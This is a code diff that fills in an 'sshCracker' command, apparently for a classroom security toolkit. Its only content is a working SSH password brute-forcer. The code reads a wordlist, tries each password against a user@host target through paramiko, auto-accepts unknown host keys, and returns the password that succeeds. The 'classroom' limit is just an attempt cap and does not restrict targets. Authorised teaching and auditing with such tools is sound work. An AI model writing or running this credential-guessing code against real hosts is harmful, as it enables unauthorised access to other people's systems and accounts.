@@ -26,11 +26,28 @@ class SshCrackerCommand(BaseCommand):
     MAX_ATTEMPTS = 10_000
 
     def run(self, args, context: ToolContext) -> str:
-        # TODO: Audit only the supplied classroom SSH target.
-        # 1. Require target/password-file arguments and use ``parse_ssh_target``.
-        # 2. Validate the file and enforce MAX_ATTEMPTS before making connections.
-        # 3. Import paramiko here so other commands work without that dependency.
-        # 4. Try passwords sequentially, always close the client, and distinguish
-        #    a rejected password from a service/network error.
-        # 5. Return the accepted password or a not-found summary.
-        raise NotImplementedError("Implement the sshCracker command")
+        self.require_count(args, 2, COMMAND_SPEC.usage)
+        user, host, port = parse_ssh_target(args[0])
+        password_file = Path(args[1]).expanduser().resolve(strict=False)
+        if not password_file.is_file():
+            raise CommandError(f"Password file not found: {password_file}")
+        try:
+            import paramiko
+        except ImportError as error:
+            raise FeatureUnavailable("Install paramiko to use sshCracker") from error
+        passwords = password_file.read_text(encoding="utf-8", errors="replace").splitlines()
+        if len(passwords) > self.MAX_ATTEMPTS:
+            raise CommandError(f"Password file exceeds the {self.MAX_ATTEMPTS}-attempt classroom limit")
+        for attempt_number, password in enumerate(passwords, start=1):
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            try:
+                client.connect(hostname=host, port=port, username=user, password=password, look_for_keys=False, allow_agent=False, timeout=4, auth_timeout=4, banner_timeout=4)
+                return f"Password found after {attempt_number} attempts: {password}"
+            except paramiko.AuthenticationException:
+                continue
+            except (paramiko.SSHException, OSError) as error:
+                raise CommandError(f"SSH service error at {host}:{port}: {error}") from error
+            finally:
+                client.close()
+        return f"No password matched after {len(passwords)} attempts."
